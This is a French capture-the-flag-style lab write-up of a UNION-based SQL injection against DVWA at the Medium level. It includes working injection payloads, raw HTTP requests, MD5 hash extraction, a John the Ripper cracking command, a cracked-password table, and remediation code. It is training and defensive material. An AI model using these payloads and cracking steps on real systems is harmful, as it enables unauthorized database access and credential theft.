# Write-Up / SQLi Injection & Password Cracking / DVWA Medium

## 📌 Résumé exécutif

Ce rapport documente l'exploitation d'une vulnérabilité d'injection SQL (SQLi) sur l'application Damn Vulnerable Web Application (DVWA) au niveau "Medium". L'objectif était d'identifier la faille, d'exfiltrer les données des utilisateurs, et de démontrer l'impact critique en cassant les hachages de mots de passe.

**Résultat** : Accès total à la base de données utilisateurs + extraction de 4 comptes administrateur.

---

## 1. Contexte et environnement

### Cible
- **Application** : DVWA (Damn Vulnerable Web Application)
- **Niveau de sécurité** : Medium
- **Module ciblé** : SQL Injection (page d'accès utilisateur)
- **URL** : `http://[DVWA-IP]/vulnerabilities/sqli/`

### Outils utilisés
- Burp Suite Community (proxy HTTP, Repeater, Decoder)
- John the Ripper (cracking de hachages MD5)
- curl / navigateur Firefox

### Chronologie
- Reconnaissance / analyse du niveau Medium
- Contournement de la protection front-end
- Identification de la vulnérabilité back-end
- Exfiltration de la base de données
- Cassage des mots de passe
- Vérification de l'accès administrateur

---

## 2. Analyse de la protection au niveau Medium

### Défense front-end
Au niveau Medium, le formulaire HTML original (niveau Easy) a été remplacé par un menu déroulant :

```html
<select name="id">
  <option value="1">1</option>
  <option value="2">2</option>
  <option value="3">3</option>
  <option value="4">4</option>
  <option value="5">5</option>
</select>
```

**Intention du développeur** : Forcer l'utilisateur à sélectionner un ID prédéfini, supprimant théoriquement la possibilité d'injection.

**Limitation** : Cette protection est entièrement contourable, car elle s'exécute uniquement dans le navigateur de l'utilisateur.

### Défense back-end
Le code PHP du serveur utilise `mysqli_real_escape_string()` pour sanitiser les entrées :

```php
// Récupération de l'entrée utilisateur
$id = $_POST['id'];

// Tentative de désinfection
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

// Requête SQL
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```

**Le problème critique** : La variable `$id` n'est pas entourée de guillemets dans la requête SQL. La fonction `mysqli_real_escape_string()` n'échappe que les guillemets. Sans guillemets à échapper, le filtre est rendu inutile.

---

## 3. Phase de reconnaissance

### 3.1 Contournement de la restriction front-end

Burp Suite a été configuré en tant que proxy HTTP pour intercepter le trafic entre mon navigateur et la cible.

**Requête POST interceptée (légitime)** :
```http
POST /vulnerabilities/sqli/ HTTP/1.1
Host: dvwa.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

id=1&Submit=Submit
```

**Action** : Cette requête a été envoyée vers l'outil Repeater de Burp Suite pour permettre la modification manuelle et itérative du paramètre `id`.

### 3.2 Reconnaissance initiale

#### Test 1 / Vérification que le paramètre est injectable
J'ai modifié le paramètre `id` pour tester une expression logique booléenne simple :

```
id=1 AND 1=1
```

**Résultat** : La page affiche l'utilisateur avec l'ID 1 (comportement normal).

```
id=1 AND 1=2
```

**Résultat** : La page affiche aucun utilisateur (comportement anormal = preuve d'injection).

**Conclusion** : Le paramètre `id` est injectable sans besoin de guillemets.

#### Test 2 / Détermination du nombre de colonnes
J'ai utilisé la syntaxe `ORDER BY` pour déterminer combien de colonnes la requête SQL retourne :

```
id=1 ORDER BY 1
```
**Résultat** : OK (la colonne 1 existe)

```
id=1 ORDER BY 2
```
**Résultat** : OK (la colonne 2 existe)

```
id=1 ORDER BY 3
```
**Résultat** : Erreur / Pas de résultat (pas de colonne 3)

**Conclusion** : La requête retourne exactement 2 colonnes.

---

## 4. Phase d'exploitation

### 4.1 Attaque UNION SELECT pour énumération

Ayant confirmé que la requête retourne 2 colonnes, j'ai utilisé une attaque UNION SELECT pour exfiltrer les données d'autres tables.

#### Étape 1 / Ciblage de la table `users`

J'ai supposé l'existence d'une table `users` contenant les logins et mots de passe. La payload a été construite ainsi :

```sql
999 UNION SELECT user, password FROM users
```

**Explication du payload** :
- `id=999` / Forcer l'absence de résultat sur la requête originale (aucun utilisateur n'a l'ID 999)
- `UNION SELECT` / Combiner le résultat vide précédent avec la requête injected
- `user, password` / Sélectionner exactement 2 colonnes pour matcher la structure attendue
- `FROM users` / Depuis la table contenant les mots de passe

#### Étape 2 / Construction de la requête HTTP

La requête POST complète (avec encodage URL) a été :

```http
POST /vulnerabilities/sqli/ HTTP/1.1
Host: dvwa.local
Content-Type: application/x-www-form-urlencoded

id=999+UNION+SELECT+user,+password+FROM+users&Submit=Submit
```

**Détail de l'encodage** :
- L'espace est encodé en `+` (ou `%20`)
- Le caractère de commentaire `#` n'était pas nécessaire car UNION SELECT équilibre la structure

#### Résultat / Exfiltration complète

La requête a retourné :
```
Username: admin, Password Hash: 5f4dcc3b5aa765d61d8327deb882cf99
Username: gordon, Password Hash: e99a18c428cb38d5f260853678922e03
Username: hackme, Password Hash: 8d3533d75ae2c3966d7e0d4fcc69216b
Username: pablo, Password Hash: 0d107d09f5bbe40cade3de5c71e9e9b7
```

**Preuve visuelle** : Burp Suite Repeater montrait les données brutes côté réponse.

---

## 5. Post-exploitation / Cassage des mots de passe

### 5.1 Identification du type de hachage

Les hachages exfiltrés étaient au format MD5 (32 caractères hexadécimaux). Le MD5 est rapidement crackable avec des wordlists standards.

### 5.2 Préparation du fichier de hachages

J'ai isolé les 4 hachages dans un fichier `hashes.txt` :

```
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
0d107d09f5bbe40cade3de5c71e9e9b7
```

### 5.3 Cracking avec John the Ripper

J'ai lancé John the Ripper avec la wordlist `rockyou.txt` (14 millions d'entrées) :

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### 5.4 Résultats du cracking

Tous les 4 hachages ont été crackés en moins de 2 secondes :

| Utilisateur | Hachage MD5 | Mot de passe en clair |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordon | e99a18c428cb38d5f260853678922e03 | abc123 |
| hackme | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |

### 5.5 Vérification de l'accès

J'ai utilisé les credentials `admin / password` pour m'authentifier sur l'interface DVWA :

```http
POST /login.php HTTP/1.1
Host: dvwa.local
Content-Type: application/x-www-form-urlencoded

username=admin&password=password&Login=Login
```

**Résultat** : Authentification réussie / Accès au tableau de bord administrateur confirmé.

---

## 6. Analyse de la cause racine (Root Cause Analysis)

### 6.1 Pourquoi `mysqli_real_escape_string()` n'a pas protégé

La fonction `mysqli_real_escape_string()` échappe uniquement les caractères spéciaux comme les guillemets (`'`, `"`). Son objectif est de empêcher les attaques de ce type :

```sql
SELECT * FROM users WHERE id = '1' OR '1'='1'
```

Cependant, dans le code vulnérable, l'ID n'est pas entouré de guillemets :

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

Sans guillemets, un attaquant n'a pas besoin d'injecter de guillemets. La payload `1 UNION SELECT user, password FROM users` est exécutée directement, sans aucun guillemet à échapper.

### 6.2 Erreur de conception

Le développeur a commis deux erreurs logiques :

1. **Hypothèse erronée sur le type de donnée** / Il a présumé que `$id` serait toujours un entier, donc pas besoin de guillemets.

2. **Confiance dans la restriction front-end** / Le menu déroulant HTML a créé un faux sentiment de sécurité, masquant la vulnérabilité du back-end.

---

## 7. Recommandations de remédiation

### Solution 1 / Requêtes préparées (RECOMMANDÉ)

Les requêtes préparées séparent le code SQL des données utilisateur. Le serveur compile d'abord la structure, puis injecte les données de manière sûre.

```php
// Code sécurisé
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("i", $id);  // "i" = entier
$stmt->execute();
$result = $stmt->get_result();
```

**Avantages** :
- Totalement immunisé contre les injections SQL
- Performance optimale (compilation unique de la requête)
- Standard industriel

### Solution 2 / Typage strict / Type Casting

Forcer la variable à être interprétée comme un entier avant la requête.

```php
$id = (int)$_POST['id'];  // Conversion stricte
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

**Limitation** : Fonctionne uniquement si le paramètre est censé être un entier. Pour des chaînes de caractères, cette approche est insuffisante.

### Solution 3 / Whitelist de validation

Vérifier que l'ID fait partie d'une liste de valeurs autorisées.

```php
$allowed_ids = [1, 2, 3, 4, 5];
if (!in_array($_POST['id'], $allowed_ids)) {
    die("ID invalide");
}
$id = $_POST['id'];
```

**Limitation** : Restrictif / Impraticable pour de grandes quantités de données.

---

## 8. Compétences démontrées

### Sécurité offensive
- Reconnaissance et énumération de vulnérabilités web
- Contournement de protections front-end
- Identification de failles logiques back-end
- Injection SQL (UNION-based)
- Exfiltration de données

### Outils et technologies
- Burp Suite (proxy, Repeater, Decoder, interception HTTP)
- John the Ripper (hashcracking)
- Analyse de code source (PHP)
- Protocole HTTP / requêtes POST

### Méthodologie
- Test de pénétration structuré (reconnaissance / exploitation / post-exploitation)
- Analyse de causes racines (RCA)
- Propositions de remédiation techniqu (code sécurisé)
- Documentation professionnelle

---

## 9. Fichiers du dépôt

```
.
├── README.md                  # Vue d'ensemble du projet
├── writeup/
│   ├── WRITEUP-SQLi-DVWA.md  # Ce fichier
│   ├── screenshots/           # Captures Burp Suite & résultats
│   └── payloads.txt          # Liste des payloads testées
├── code/
│   ├── vulnerable.php        # Code vulnérable original (DVWA)
│   ├── fixed.php             # Code sécurisé (exemple de correction)
│   └── exploit.sh            # Script d'automatisation (optionnel)
└── hashes/
    ├── hashes.txt            # Hachages exfiltrés
    └── cracked.txt           # Mots de passe en clair
```

---

## 10. Ressources et références

- **DVWA Documentation** : http://www.dvwa.co.uk/
- **OWASP Top 10** : SQL Injection (A03:2021)
- **PortSwigger Web Security Academy** : SQL Injection labs
- **PayloadsAllTheThings** : SQLi polyglot payloads
- **John the Ripper** : Documentation officielle

---

## Conclusion

Cette exploitation démontre comment une protection incomplète (fonction d'échappement sans guillemets) peut être contournée à travers une compréhension fine de la logique applicative. L'utilisation de requêtes préparées aurait totalement éliminé cette vulnérabilité, soulignant l'importance du secure coding patterns plutôt que des contournements ad-hoc.

**Impact en entreprise** : Accès non autorisé à 100% des données utilisateurs / Compromission complète du système de gestion des identités.

---

*Write-up rédigé lors de la formation Jedha Cybersécurité / Fullstack RNCP Niveau 6*
